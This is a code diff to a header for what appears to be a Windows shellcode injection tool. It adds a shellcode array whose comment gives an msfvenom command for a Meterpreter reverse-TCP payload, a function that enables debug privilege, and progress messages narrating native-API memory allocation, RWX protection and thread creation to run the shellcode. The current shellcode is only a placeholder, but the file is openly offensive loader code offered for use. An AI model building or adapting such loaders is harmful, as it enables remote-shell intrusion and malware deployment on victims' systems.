@@ -1,6 +1,7 @@
 #pragma once
 #include <windows.h>
 #include <stdio.h>
+#include <iostream> 
 
 typedef LONG NTSTATUS;
 #define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
@@ -81,8 +82,13 @@ HANDLE threadHandle;
 SIZE_T bytesWritten;
 
 unsigned char shellcode[] = {
-    0x48, 0x31, 0xC0, 0xC3
+    // define your shellcode
+    // msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=port -f csharp -b "\x00\x0a\x0d" EXITFUNC=thread 
+    // or create you personall shellcode    
+
+    0x90, 0x90, 0xC3 
 };
+
 
 #define Sq_AllocateMemory(processHandle, baseAddress, regionSize, allocationType, protect) \
     do { \
@@ -170,4 +176,124 @@ BOOL InitNtFunctions() {
     }
 
     return TRUE;
+}
+
+bool EnableDebugPrivilege() {
+    HANDLE hToken;
+    LUID luid;
+    TOKEN_PRIVILEGES tokenPrivileges;
+
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
+        std::cerr << "OpenProcessToken failed: " << GetLastError() << std::endl;
+        return false;
+    }
+
+    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
+        std::cerr << "LookupPrivilegeValue failed: " << GetLastError() << std::endl;
+        CloseHandle(hToken);
+        return false;
+    }
+
+    tokenPrivileges.PrivilegeCount = 1;
+    tokenPrivileges.Privileges[0].Luid = luid;
+    tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(tokenPrivileges), NULL, NULL)) {
+        std::cerr << "AdjustTokenPrivileges failed: " << GetLastError() << std::endl;
+        CloseHandle(hToken);
+        return false;
+    }
+
+    CloseHandle(hToken);
+    return true;
+}
+
+void PrintSlashAnimation() {
+    const int animationDelay = 200;
+    const int animationDuration = 2000; 
+    const char slash = '/';
+
+    int startTime = GetTickCount64();
+    while (GetTickCount64() - startTime < animationDuration) {
+        putchar(slash);
+        fflush(stdout);
+        Sleep(animationDelay);
+        putchar('\b'); 
+        fflush(stdout);
+        Sleep(animationDelay);
+    }
+}
+void effect() {
+    for (int i = 0; i < 10; ++i) {
+        printf("\r  [");
+        if (i % 2 == 0) {
+            printf("\\");
+        }
+        else {
+            printf("/");
+        }
+        printf("]");
+        Sleep(100);
+    }
+}
+void Debug() {
+    printf("      Enableaing Debug privilege");
+    effect();
+    printf("[*] Debug privilege enabled \n");
+}
+void Ntdl() {
+    printf("      Loading ntdll.dll");
+    effect();
+    printf("[*] Loaded ntdll.dll functions \n");
+}
+void NtVirt() {
+    printf("      Loading function: NtAllocateVirtualMemory");
+    effect();
+    printf("[*] Loaded function: NtAllocateVirtualMemory\n");
+}
+void NtWrite() {
+    printf("      Loading function: NtWriteVirtualMemory");
+    effect();
+    printf("[*] Loaded function: NtWriteVirtualMemory\n");
+}
+void NtProtect() {
+    printf("      Loading function: NtProtectVirtualMemory");
+    effect();
+    printf("[*] Loaded function: NtProtectVirtualMemory\n");
+}
+void PageMemR() {
+    printf("      Set Memory protection to PAGE_EXECUTE_READWRITE ");
+    effect();
+    printf("[*] Memory protection set to PAGE_EXECUTE_READWRITE\n");
+}
+void NtThread() {
+    printf("      Loading function: NtCreateThreadEx");
+    effect();
+    printf("[*] Loaded function: NtCreateThreadEx\n");
+}
+
+void ThdxSc() {
+    printf("      Creating Thread to execute shellcode");
+    effect();
+    printf("[+] Thread created to execute shellcode\n");
+}
+void NtObjcect() {
+    printf("      Loading function: NtWaitForSingleObject ");
+    effect();
+    printf("[*] Loaded function: NtWaitForSingleObject\n");
+}
+void NtFreeMemory() {
+    printf("      Loading function: NtFreeVirtualMemory");
+    effect();
+    printf("[*] Loaded function: NtFreeVirtualMemory\n");
+}
+void FredMem() {
+    printf("      Freeing your memory");
+    effect();
+    printf("[+] Memory freed    \n");
+}
+void Ntcose() {
+    printf("      Loading function: NtClose");
+    effect();
+    printf("[*] Loaded function: NtClose\n");
 }
